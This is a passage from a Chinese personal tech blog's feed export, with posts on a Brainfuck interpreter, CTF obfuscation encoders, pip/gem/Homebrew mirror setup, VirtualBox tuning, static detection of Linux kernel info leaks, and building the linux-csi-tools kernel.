class="number">100</span>)</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">"RANGE ERROR"</span>), <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        FILE *z;</span><br><span class="line">        q=argc;</span><br><span class="line">         <span class="keyword">if</span>(z=fopen(argv[<span class="number">1</span>],<span class="string">"r"</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span>( (b=getc(z))&gt;<span class="number">0</span> )</span><br><span class="line">                        *s++=b;</span><br><span class="line">                *s=<span class="number">0</span>;</span><br><span class="line">                interpret(f);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下就可以用了。</p><p>嗯，就这些。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一些隐写题中可能会出此现这种东西，下面我来大概介绍一下：&lt;/p&gt;
&lt;p&gt;官方网站: &lt;a href=&quot;http://www.muppetlabs.com/~breadbox/bf/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.mup
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux下使用锐捷的方法</title>
    <link href="http://zer0yu.github.io/2017/01/22/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8%E9%94%90%E6%8D%B7%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://zer0yu.github.io/2017/01/22/Linux下使用锐捷的方法/</id>
    <published>2017-01-22T02:45:46.000Z</published>
    <updated>2017-01-22T02:48:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实很简单一个命令就搞定（前提是你有这个<a href="https://pan.baidu.com/s/1bo13wYF" target="_blank" rel="noopener">脚本</a>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载之后先解压：</span></span><br><span class="line"></span><br><span class="line">unzip RuijieForLinux.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">之后<span class="built_in">cd</span> 进去</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">在然后呢</span></span><br><span class="line"></span><br><span class="line">sudo chmod +x ./rjsupplicant.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">再然后呢</span></span><br><span class="line"></span><br><span class="line">sudo ./rjsupplicant.sh -u 你的学号 -p 你的密码 -s 收费资源/免费资源</span><br></pre></td></tr></table></figure><p>第一次使用时，可以通过 –help命令查看使用帮助文档</p><p>贴个效果图：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/linux-rj.png" alt="1"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实很简单一个命令就搞定（前提是你有这个&lt;a href=&quot;https://pan.baidu.com/s/1bo13wYF&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;脚本&lt;/a&gt;）&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中那些有趣的混淆</title>
    <link href="http://zer0yu.github.io/2017/01/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E6%B7%86/"/>
    <id>http://zer0yu.github.io/2017/01/22/CTF中那些有趣的混淆/</id>
    <published>2017-01-22T02:40:24.000Z</published>
    <updated>2017-01-22T02:41:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>​    ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。</p><h4 id="ppencode-Perl"><a href="#ppencode-Perl" class="headerlink" title="ppencode-Perl"></a>ppencode-Perl</h4><p>台湾的Perl达人<a href="http://pugs.blogs.com/" target="_blank" rel="noopener">唐鳳</a>在<a href="http://yapcasia.org/2010/" target="_blank" rel="noopener">YAPC</a>曾经介绍过<a href="http://www.slideshare.net/autang/ppencode" target="_blank" rel="noopener">ppencode</a>，它可以把Perl代码转换成只有英文字母的字符串。</p><p>下面是转换示例：</p><p>Demo的地址：<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="noopener">http://namazu.org/~takesako/ppencode/demo.html</a>。</p><h4 id="rrencode-Ruby"><a href="#rrencode-Ruby" class="headerlink" title="rrencode-Ruby"></a>rrencode-Ruby</h4><p>rrencode可以把ruby代码全部转换成符号。</p><p>下面是转换示例：</p><p>项目地址：<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="noopener">http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html</a>。</p><h4 id="jjencode-aaencode-Javascript"><a href="#jjencode-aaencode-Javascript" class="headerlink" title="jjencode/aaencode-Javascript"></a>jjencode/aaencode-Javascript</h4><p><a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="noopener">jjencode</a>和aaencode都是<a href="http://twitter.com/#!/hasegawayosuke" target="_blank" rel="noopener">Yosuke HASEGAWA</a>的作品，前者将JS代码转换成只有符号的字符串，类似于rrencode，介绍的PPT见<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="noopener">http://utf-8.jp/public/20090710/jjencode.pps</a>。</p><p>后者更好玩，可以将JS代码转换成常用的网络表情，例如“(ﾟΘﾟ)”。示例如下：</p><p>Demo的地址是：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a>，转换的代码并不复杂，可以在源代码里看到。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​    ppencode/rrencode/jjencode/aaencode是Perl、Ruby、Javascript的小工具，可以将各自的代码进行混淆，转换成特殊字符，甚至还可以转换成有意思的表情。&lt;/p&gt;
&lt;h4 id=&quot;ppencode-Perl&quot;&gt;&lt;a href
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pip源的修改</title>
    <link href="http://zer0yu.github.io/2017/01/22/pip%E6%BA%90%E7%9A%84%E4%BF%AE%E6%94%B9/"/>
    <id>http://zer0yu.github.io/2017/01/22/pip源的修改/</id>
    <published>2017-01-22T02:37:55.000Z</published>
    <updated>2017-01-22T02:39:59.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-在windows环境下修改pip镜像源的方法-以python3-5为例"><a href="#1-在windows环境下修改pip镜像源的方法-以python3-5为例" class="headerlink" title="1:在windows环境下修改pip镜像源的方法(以python3.5为例):"></a>1:在windows环境下修改pip镜像源的方法(以python3.5为例):</h4><p>(1):在windows文件管理器中,输入 %APPDATA%</p><p>(2):会定位到一个新的目录下，在该目录下新建pip文件夹，然后到pip文件夹里面去新建个pip.ini文</p><p>(3):在新建的pip.ini文件中输入以下内容，搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure><h4 id="2：在linux系统中更新pip源的方式-以centos-python2-7为例"><a href="#2：在linux系统中更新pip源的方式-以centos-python2-7为例" class="headerlink" title="2：在linux系统中更新pip源的方式(以centos,python2.7为例)"></a>2：在linux系统中更新pip源的方式(以centos,python2.7为例)</h4><p>在linux环境下的修改方式和在windows环境下修改方式基本相同，这里简单总结一下:</p><p>(1):在用户的家目录下面创建名为.pip文件夹</p><p>(2):在创建好的.pip文件夹中创建名为pip.conf的文件</p><p>(3):在pip.conf文件中输入以下内容，ok!!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line">trusted-host = pypi.douban.com</span><br></pre></td></tr></table></figure><h4 id="3：macOS更改pip源"><a href="#3：macOS更改pip源" class="headerlink" title="3：macOS更改pip源"></a>3：macOS更改pip源</h4><p>在终端进入目录：<code>cd ~/</code></p><p>如果没有 .pip 文件夹，那么就要新建这个文件夹，<code>mkdir .pip</code></p><p>然后在.pip 文件夹内<code>vim pip.conf</code>，</p><p>写入阿里云</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line"></span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>或者可以使用豆瓣的镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.douban.com/simple</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line"></span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><p>好了现在你可以体验快的飞起的pip了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-在windows环境下修改pip镜像源的方法-以python3-5为例&quot;&gt;&lt;a href=&quot;#1-在windows环境下修改pip镜像源的方法-以python3-5为例&quot; class=&quot;headerlink&quot; title=&quot;1:在windows环境下修改pip
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>你会用你的虚拟机吗?(一)</title>
    <link href="http://zer0yu.github.io/2017/01/22/%E4%BD%A0%E4%BC%9A%E7%94%A8%E4%BD%A0%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%90%97-%E4%B8%80/"/>
    <id>http://zer0yu.github.io/2017/01/22/你会用你的虚拟机吗-一/</id>
    <published>2017-01-22T02:29:45.000Z</published>
    <updated>2017-01-22T02:36:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>怎么可以让你的虚拟机运行的更快呢？</p><h4 id="1、开启CPU的硬件虚拟化功能"><a href="#1、开启CPU的硬件虚拟化功能" class="headerlink" title="1、开启CPU的硬件虚拟化功能"></a>1、开启CPU的硬件虚拟化功能</h4><p>现在的CPU几乎都支持硬件虚拟化功能，英特尔称之为VT-x技术，AMD称之为AMD-V技术。在百度搜索你的笔记本型号或主板型号+开启虚拟化，就可以找到相应的开启方法。一般是开机进入bios，然后找到虚拟化技术的选项，将disabled改为enabled。据我所知，用英特尔CPU的电脑，虚拟化技术的选项名称大概含有“virtualization technology”的字眼。</p><p>BIOS开启成功后，在虚拟机的设置中，启用硬件加速。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-1.png" alt="1"></p><p>当你成功开启硬件虚拟化功能时，虚拟机的窗口右下角有一个蓝色V的图标，鼠标移上去就会提示成功开启。</p><h4 id="2、给虚拟机分配足够的内存"><a href="#2、给虚拟机分配足够的内存" class="headerlink" title="2、给虚拟机分配足够的内存"></a>2、给虚拟机分配足够的内存</h4><p>既然本机有4GB的内存，那么可以分配1GB供虚拟机上的Ubuntu使用。内存大小根据虚拟机系统的需要来定，如果你跑XP，那么分配512MB已经很足够了。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-2.png" alt="2"></p><h4 id="3、开启3D加速，分配足够显存"><a href="#3、开启3D加速，分配足够显存" class="headerlink" title="3、开启3D加速，分配足够显存"></a>3、开启3D加速，分配足够显存</h4><p>笔者觉得当初Ubuntu界面卡顿很有可能跟显卡方面的设置有关。于是开启了3D加速，分配了32MB的显存给VirtualBox。性能提升很明显。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/vbox-3.png" alt="3"></p><h4 id="4、安装VirtualBox增强功能"><a href="#4、安装VirtualBox增强功能" class="headerlink" title="4、安装VirtualBox增强功能"></a>4、安装VirtualBox增强功能</h4><p>启动虚拟机。单击虚拟机菜单中的“设备”&gt;“安装增强功能”，也可以按快捷键Host+D。Host键就是虚拟机窗口右下方显示的键，默认为Right Ctrl，即右边的Ctrl键。然后系统会加载增强功能所在的虚拟光盘。点击运行，按提示完成安装，重启虚拟机。</p><h4 id="5、电脑的核心都挺多的"><a href="#5、电脑的核心都挺多的" class="headerlink" title="5、电脑的核心都挺多的"></a>5、电脑的核心都挺多的</h4><p>多分个核就好了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;怎么可以让你的虚拟机运行的更快呢？&lt;/p&gt;
&lt;h4 id=&quot;1、开启CPU的硬件虚拟化功能&quot;&gt;&lt;a href=&quot;#1、开启CPU的硬件虚拟化功能&quot; class=&quot;headerlink&quot; title=&quot;1、开启CPU的硬件虚拟化功能&quot;&gt;&lt;/a&gt;1、开启CPU的硬件虚拟化功能&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>gem更换国内源</title>
    <link href="http://zer0yu.github.io/2017/01/22/gem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90/"/>
    <id>http://zer0yu.github.io/2017/01/22/gem更换国内源/</id>
    <published>2017-01-22T02:26:43.000Z</published>
    <updated>2017-01-22T02:27:16.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gem sources -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">移除https://rubygems.org源</span></span><br><span class="line"></span><br><span class="line">gem sources --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">增加https://gems.ruby-china.org/源</span></span><br><span class="line"></span><br><span class="line">gem sources -a https://gems.ruby-china.org/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">更新缓存</span></span><br><span class="line"></span><br><span class="line">gem sources -u</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>替换homebrew默认源</title>
    <link href="http://zer0yu.github.io/2017/01/22/%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90/"/>
    <id>http://zer0yu.github.io/2017/01/22/替换homebrew默认源/</id>
    <published>2017-01-22T02:25:23.000Z</published>
    <updated>2017-01-22T02:26:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>网上搜的好多都不能用了，但是这个是可以的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd "$(brew --repo)"</span><br><span class="line">git remote set-url origin git://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网上搜的好多都不能用了，但是这个是可以的。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux内核info leak漏洞</title>
    <link href="http://zer0yu.github.io/2017/01/22/Linux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zer0yu.github.io/2017/01/22/Linux内核info-leak漏洞/</id>
    <published>2017-01-22T02:22:51.000Z</published>
    <updated>2017-01-22T02:24:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>摘要: 介绍一种Linux内核的信息泄漏漏洞检测方法。没什么内容，语义分析，可以集成在Coverity等静态扫描工具中。</p><h4 id="1-Information-Leak漏洞风险"><a href="#1-Information-Leak漏洞风险" class="headerlink" title="1  Information Leak漏洞风险"></a>1  Information Leak漏洞风险</h4><p>从应用层软件，到hypervisor再到kernel代码，都存在Information <strong>Leak</strong>的风险。下面给出一些示例：</p><p>应用层软件：通常是应用敏感数据泄漏，比如从远程客户端获取服务端敏感数据。CVE-2012-0053，Openssl的心脏滴血等。</p><p>Hypervisor：主要是向guest泄漏hypervisor数据。CVE-2010-4525.</p><p>Kernel代码：泄漏内核地址，空间布局等，如CVE-2013-2147.</p><p>这里主要分析内核中的Information <strong>Leak</strong>漏洞所带来的风险。内核中的Information <strong>Leak</strong>通常都是用来绕过内核中的保护机制（利用缓解：StackGuard, ASLR），由于本身并不能直接用来形成提权等高风险操作，因此Information <strong>Leak</strong>漏洞经常被人忽视。</p><p>先来看一下这些保护机制。</p><p>StackGuard.</p><p>StackGuard是一种编译器实现的保护技术，它在栈函数返回地址前插入一个“canary”，当发生溢出“canary”值被破坏，将触发系统的异常处理流程。它的安全性依赖于“canary”的保密，也就是“canary”不能被攻击者预测或取到。</p><p>ASLR.</p><p>ASLR技术是将进程等的加载地址随机化，它的安全性依赖于加载基地址的不可预测，使exploit不能精确进行地址覆盖。</p><p>无论“canary”还是ASLR的基地址，对攻击者来说都是“秘密”。也就是在没有Information <strong>Leak</strong>漏洞前提下，这些都是用户不可直接获取的。但Information <strong>Leak</strong>漏洞可以辅助攻击者获取到这些“秘密”，进而绕过内核中的保护机制，成功实现漏洞利用。</p><h4 id="2-Information-Leak漏洞分类"><a href="#2-Information-Leak漏洞分类" class="headerlink" title="2  Information Leak漏洞分类"></a>2  Information Leak漏洞分类</h4><p>根据漏洞成因，可以对Information <strong>Leak</strong>漏洞进行分类。这里同样只关注内核中的情况。</p><p>字节对齐带来的内存“空洞”.</p><p>为了程序性能，编译器在编译代码时会对变量进行字节对齐，从而引入了一些内存“空洞”。比如结构体使用sizeof计算的大小一般会大于各个成员占用空间大小的和。当这些内核中的内存“空洞”没有被初始化（ABI没有规定函数退栈时要清理这些栈空间），通过copy_to_user等函数拷贝到用户空间时，就会造成Information <strong>Leak</strong>漏洞，泄漏内核栈中的数据，比如泄漏了一个栈上指针，就可以通过它来计算进程基址（stackjack攻击）。</p><p>缺少变量初始化.</p><p>内核函数中的本地变量声明后，默认不会被初始化。根据C99描述这块空间的内容是不确定的。实际上栈空间是被各函数复用的，因此未初始化变量的内容很可能保存的是上个函数栈上的数据。</p><p>缺少对用户读操作的检查.</p><p>当向用户空间拷贝数据时，没有做大小检查或者检查逻辑出现错误，都会导致Information <strong>Leak</strong>。这类漏洞通常称作“越界读”，它允许用户态读取不应该被访问的内核空间数据。</p><p>其它bug导致的infoleaks.</p><p>其它的Information <strong>Leak</strong>原因这里不做研究，但提一下。比如/proc/,/sys/和/boot/文件系统中也提供了内核符号地址，它们已经靠kptr_restrict机制保护，但也可能因为bug而绕过。另外系统缓存，日志等都有可能导致Information <strong>Leak</strong>.</p><p>上面说到Information <strong>Leak</strong>可能危害保证StackGuard和ASLR可靠基础的“秘密”，下面分析一下内核中的Information <strong>Leak</strong>确切会影响哪些数据。</p><p>Data段.</p><p>内核中的data段保存了编译时就确定的全局变量，data段的泄漏可能导致静态内核symbols的泄漏，比如某些用于配置的变量。</p><p>栈</p><p>内核栈是根据ABI约定，运行时分配的。里面包含了函数返回地址，栈指针和一些其它数据。比如函数调用的参数，StackGuard机制的“canary”等。另外如果没有实现栈地址随机化，还会泄漏栈布局。</p><p>堆</p><p>内核中的堆是由内存分配器管理，在需要的地方动态分配。这些堆分配器通常使用双向链表来管理这些堆内存。Information <strong>Leak</strong>会漏洞这些堆存储的内容，还有可能泄漏用于堆管理的结构数据。</p><h4 id="3-栈的Information-Leak漏洞检测技术"><a href="#3-栈的Information-Leak漏洞检测技术" class="headerlink" title="3  栈的Information Leak漏洞检测技术"></a>3  栈的Information Leak漏洞检测技术</h4><p>分析目前的漏检测技术，发现通过数据流分析的方法，可以对Information <strong>Leak</strong>进行建模来进行漏洞检测。在模型里定义3个基本元素：数据源，数据接收方和传播路径。</p><p>我们可以对程序进行语义分析来匹配这套模型，从而识别漏洞。语义分析这个工作，选用开源的Coccinelle工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">handler(...) &#123;</span><br><span class="line"></span><br><span class="line"> &lt;...</span><br><span class="line"></span><br><span class="line"> T ID;</span><br><span class="line"></span><br><span class="line"> ... when != memset(&amp;ID, 0, ...)</span><br><span class="line"></span><br><span class="line"> when != ID = ...</span><br><span class="line"></span><br><span class="line">* copy_to_user(EV, &amp;ID, EN)</span><br><span class="line"></span><br><span class="line"> ...&gt;&#125;</span><br></pre></td></tr></table></figure><p>1)  数据源：ID变量</p><p>2)  数据接收方：用户态指针EV</p><p>3)  传播路径：我们想确定ID的内容没有被初始化。因此限定条件，ID在copy_to_user前没有memset()或初始化操作</p><p>像其它基于数据流的静态检测技术类似，这种方法也存在缺陷。比如这种Information <strong>Leak</strong>检测方法假定漏洞发生在一个函数内的，因此这种方法覆盖不了多函数场景。但实际测试中，依然会发现很多Linux内核和三方Driver的Information <strong>Leak</strong>漏洞。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;摘要: 介绍一种Linux内核的信息泄漏漏洞检测方法。没什么内容，语义分析，可以集成在Coverity等静态扫描工具中。&lt;/p&gt;
&lt;h4 id=&quot;1-Information-Leak漏洞风险&quot;&gt;&lt;a href=&quot;#1-Information-Leak漏洞风险&quot; class=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux-csi-tools部署记录</title>
    <link href="http://zer0yu.github.io/2017/01/21/linux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/"/>
    <id>http://zer0yu.github.io/2017/01/21/linux-csi-tools部署记录/</id>
    <published>2017-01-21T15:07:59.000Z</published>
    <updated>2017-01-21T15:19:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>我采用<a href="http://dhalperi.github.io/linux-80211n-csitool/old_installation.html" target="_blank" rel="noopener">old installation instruction</a> 的方法，并对里面个别几个地方有所修改，以适应国内有墙的现状。<br>参考了一部分<a href="http://blog.csdn.net/sodleave/article/details/44219291" target="_blank" rel="noopener">这个博客</a>。<br>打开终端把代码复制到终端运行即可。</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>我安装了Ubuntu10.04 desktop-i386版，使用的是刻录光盘镜像的方法，大家也可以制作启动u盘或者用虚拟机安装到物理硬盘（我最喜欢的方式）。注意/home分区要留足够的空间（建议10gb以上），/分区也要足够大，建议5gb以上。其他部分很简单，按照安装包的指示一步步来就可以。因为要编译新内核，根目录空间不足的话会不成功。<br>安装的时候注意几个问题，linux碎片化严重，用不受支持的linux发行版或版本会导致编译失败，非常令人头疼。而ubuntu lts版支持时间也不长，安装软件的话如果apt用不了可以试着去百度或launchpad找deb包。</p><p>到<a href="https://github.com/dhalperi/linux-80211n-csitool/" target="_blank" rel="noopener">对方提供的github网址</a>里面，下载源代码，到右栏可以找到download zip file，下载完毕之后解压放到～/下面，文件夹改名为linux-80211n-csitool<br>（放到别的地方也可以，不过需要修改下面每一条引用它的代码），由于国内网络环境不好，文件过大，用git clone的话及其容易失败，其他的小文件没关系，大家自己解决vpn吧，到网上搜索linvpn应该可以用一阵子，不过ubuntu的vpn设置方面有几点需要注意，百度上面也有介绍。<br><strong>现在比较好用的解决网络问题的方案是lantern和hosts</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>把下面内容粘贴进去，保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># blacklist modules under active development</span><br><span class="line">        blacklist iwldvm</span><br><span class="line">        blacklist iwlwifi</span><br><span class="line">        blacklist mac80211</span><br><span class="line">        blacklist cfg80211</span><br></pre></td></tr></table></figure><p>该步骤是为了禁止wifi，这样做的目的是让安装驱动的时候不容易出问题</p><h4 id="Install-necessary-packages-on-Ubuntu"><a href="#Install-necessary-packages-on-Ubuntu" class="headerlink" title="Install necessary packages on Ubuntu"></a>Install necessary packages on Ubuntu</h4><p>安装内核组件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git-core kernel-package fakeroot build-essential ncurses-dev</span><br></pre></td></tr></table></figure><p>它们是用来编译用户空间工具的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install libnl-dev libssl-dev    # Install some necessary libraries</span><br></pre></td></tr></table></figure><p>iw可以用来在命令行界面开启wifi的监控模式和开启40mhz信道。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install iw</span><br></pre></td></tr></table></figure><h4 id="Download-configure-compile-and-install-our-custom-Linux-kernel"><a href="#Download-configure-compile-and-install-our-custom-Linux-kernel" class="headerlink" title="Download, configure, compile, and install our custom Linux kernel"></a>Download, configure, compile, and install our custom Linux kernel</h4><p>下载附加的工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://github.com/dhalperi/linux-80211n-csitool-supplementary.git</span><br></pre></td></tr></table></figure><p>设置内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd linux-80211n-csitool                 # Go into the kernel src directory</span><br><span class="line">make oldconfig                          # Use our optimized kernel config</span><br><span class="line">make menuconfig                         # Enable your system-specific hardware</span><br></pre></td></tr></table></figure><p>编译内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">make -j3 bzImage modules                # -j3 here is 3-way parallelism, try #cores+1</span><br><span class="line">sudo make install modules_install       # INSTALL</span><br><span class="line">sudo mkinitramfs -o /boot/initrd.img-`cat include/config/kernel.release` \</span><br><span class="line">        `cat include/config/kernel.release`     # create ramdisk used to boot</span><br><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>我在这些步骤里面出现了编译错误的情况，原因是里面的一些头文件和源代码文件名大小写不一致，解决方法是想办法把它复制一下，然后改成大小写一致的文件名（原来的不要删掉）</p><p><del>在一篇csdn blog里面，有人还这么说，如果编译出错，可以试着按照这里来做（关于这一部分，先在窗口输入cat include/config/kernel.release（注意是在 linux-80211n-csitool目录下）获取版本号，一般为3.5.7-csitool。将上述指令改为：sudo mkinitramfs -o /boot/initrd.img-3.5.7-csitool 3.5.7-csitool （注意空格）即可。后续的指令中均要将‘cat include/config/kernel.release’改为3.5.7-csitool）<strong>然而这个方法并不好用</strong></del></p><p>下面安装头文件，记录csi的软件需要用它来编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/src/linux-headers-`cat include/config/kernel.release`</span><br><span class="line">sudo cp -rf usr/include /usr/src/linux-headers-`cat include/config/kernel.release`/include</span><br></pre></td></tr></table></figure><p>编译成功之后重启，就会进入修改过的内核</p><h4 id="Install-our-custom-firmware"><a href="#Install-our-custom-firmware" class="headerlink" title="Install our custom firmware."></a>Install our custom firmware.</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>这一步把blacklist iwlwifi删掉，否则无法连接wifi，删掉之后只能连接没密码的wifi。<br>运行下面的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">backup original 